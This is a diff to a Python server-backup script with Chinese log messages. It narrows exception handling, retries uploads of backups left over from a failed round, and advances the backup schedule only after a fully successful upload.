@@ -2423,7 +1775,7 @@ def periodic_backup_upload(backup_manager):
                     if line.startswith("PRETTY_NAME="):
                         system_info["Linux发行版"] = line.split("=")[1].strip().strip('"')
                         break
-        except:
+        except (OSError, UnicodeError):
             pass
         
         # 获取内核版本
@@ -2431,7 +1783,7 @@ def periodic_backup_upload(backup_manager):
             with open("/proc/version", "r") as f:
                 kernel_version = f.read().strip().split()[2]
                 system_info["内核版本"] = kernel_version
-        except:
+        except (OSError, IndexError):
             pass
         
         # 输出启动信息和系统环境
@@ -2458,31 +1810,44 @@ def periodic_backup_upload(backup_manager):
                 logging.critical(f"⏰ 开始备份  {current_time}")
                 logging.critical("-"*40)
 
+                # 先重试上一轮未成功上传的归档，避免新一轮清理目标目录时丢失待上传文件
+                pending_paths = find_pending_backup_files(backup_manager, target)
+                if pending_paths:
+                    logging.critical(f"📤 重试上一轮遗留备份 ({len(pending_paths)} 个文件)...")
+                    if not backup_manager.upload_backup(pending_paths):
+                        logging.error("❌ 遗留备份仍有上传失败，将保留文件并继续生成本轮备份")
+
                 logging.critical("\n🖥️ 服务器指定目录备份")
                 backup_paths = backup_server(backup_manager, source, target)
 
-                # 保存下次备份时间
-                save_next_backup_time(backup_manager)
-
                 # 输出结束语（在上传之前）
                 logging.critical("\n" + "="*40)
-                next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
                 current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-                next_time = next_backup_time.strftime('%Y-%m-%d %H:%M:%S')
                 logging.critical(f"✅ 备份完成  {current_time}")
                 logging.critical("="*40)
                 logging.critical("📋 备份任务已结束")
-                logging.critical(f"🔄 下次启动备份时间: {next_time}")
                 logging.critical("="*40 + "\n")
 
                 # 开始上传备份文件
+                backup_uploaded = False
                 if backup_paths:
                     file_count = len(backup_paths)
                     logging.critical(f"📤 上传 {file_count} 个文件...")
-                    if backup_manager.upload_backup(backup_paths):
+                    backup_uploaded = backup_manager.upload_backup(backup_paths)
+                    if backup_uploaded:
                         logging.critical("✅ 上传完成")
                     else:
-                        logging.error("❌ 部分文件上传失败")
+                        logging.error("❌ 部分文件上传失败，保留本地文件等待重试")
+                else:
+                    logging.error("❌ 未生成备份文件，本轮不更新下次备份时间")
+
+                # 只有备份文件全部上传成功后才推进调度时间
+                if backup_uploaded:
+                    save_next_backup_time(backup_manager)
+                    next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
+                    logging.critical(f"🔄 下次启动备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
+                else:
+                    logging.critical("🔄 上传未完成，将在下一轮重试")
                 
                 # 上传备份日志
                 if backup_manager.config.DEBUG_MODE:
